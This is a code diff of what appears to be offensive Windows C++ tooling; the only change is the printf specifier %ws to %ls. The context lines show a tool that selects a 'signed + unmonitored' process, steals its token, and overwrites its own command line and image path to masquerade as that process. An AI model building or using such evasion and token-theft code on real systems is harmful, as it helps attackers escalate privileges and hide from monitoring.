@@ -384,7 +384,7 @@ static SignedProcessInfo PickRandomSignedProcess(DWORD maxAttempts = 48)
         result.pid       = e.pid;
         result.exeName   = e.exeName;
         result.imagePath = path;
-        printf("[+] Selected signed + unmonitored process: PID %-6lu %ws\n",
+        printf("[+] Selected signed + unmonitored process: PID %-6lu %ls\n",
                result.pid, result.exeName.c_str());
         return result;
     }
@@ -482,7 +482,7 @@ static HANDLE StealProcessToken(DWORD sourcePid, bool impersonateOnly = true)
             DWORD nLen = 256, dLen = 256;
             SID_NAME_USE use;
             if (LookupAccountSidW(NULL, tu->User.Sid, name, &nLen, domain, &dLen, &use))
-                printf("[*] Source token user: %ws\\%ws\n", domain, name);
+                printf("[*] Source token user: %ls\\%ls\n", domain, name);
         }
     }
 
@@ -604,17 +604,17 @@ static void ApplyToCurrentProcess(const ProcessStrings& src, DWORD sourcePid = 0
            GetCurrentProcessId());
 
     // CommandLine
-    printf("    CommandLine   : %ws\n", src.commandLine.c_str());
+    printf("    CommandLine   : %ls\n", src.commandLine.c_str());
     ApplyUnicodeString(&params->CommandLine, src.commandLine);
 
     // ImagePathName
-    printf("    ImagePathName : %ws\n", src.imagePathName.c_str());
+    printf("    ImagePathName : %ls\n", src.imagePathName.c_str());
     ApplyUnicodeString(&params->ImagePathName, src.imagePathName);
 
     // Console title
     if (!src.windowTitle.empty())
     {
-        printf("    WindowTitle   : %ws\n", src.windowTitle.c_str());
+        printf("    WindowTitle   : %ls\n", src.windowTitle.c_str());
         SetConsoleTitleW(src.windowTitle.c_str());
     }
     else if (!src.imagePathName.empty())
